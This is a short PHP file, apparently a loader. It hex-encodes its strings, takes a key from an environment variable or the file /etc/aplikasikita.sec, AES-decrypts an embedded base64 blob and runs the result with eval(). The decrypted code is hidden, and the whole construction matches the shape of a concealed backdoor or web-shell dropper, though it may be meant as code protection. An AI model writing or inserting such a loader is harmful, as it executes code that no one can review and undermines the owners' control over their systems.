<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('IRAn0Hro6vT0e/ZMC3wLVQ==');

$c=base64_decode(

'bO/EUX816pxW9mEzjJ0aMhR8HGy6GE1tsal7Q+U/WjjWy9pSK/Je6BLPIbCiRaxlZdAGhBCsFfoE' .
'7UOfOdwylQd8ywIoF2VyDlRMn5+aYvCzfvCbxDW4RItZa9IXshJ2NzrNncgr2uwjNlAjAJbOL3DJ' .
'cosZNTEqcMksjy9i278knqxs6lAelieGK7gFOaOFiBKYft5qBykJY2d8msW8io+wY8fwFXxND5FC' .
'FaHD+nCWMqbOzvwFqnotSejNs32isynwWEHh7ITRQgaoUddN9TMi3FIsvFiC55k8qBL3SRQToYAD' .
'vLYzMAWTWgGpQrYb3ySFJvv24N/5JRuMlKnzcLjQPeb/6cltWFPT/Eo0pEWS3o/EseNhjWffrKv9' .
'c+xrKrwuejpDByoxvk1FuUFnHvQ1dRitOnNYb7vkSN+m1z6zzsl3ooaGCqAOFg8a91ceomn9NUWl' .
'tna/qs53mUCx3bCt2x9mjkCWLINjwmGNXcQLhx3Kfv0mPHgpAbZwZaqamv4yxeENLsFJS7/n9Y/7' .
'BgWaz/dVnOhx1IiS3M5yARo='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

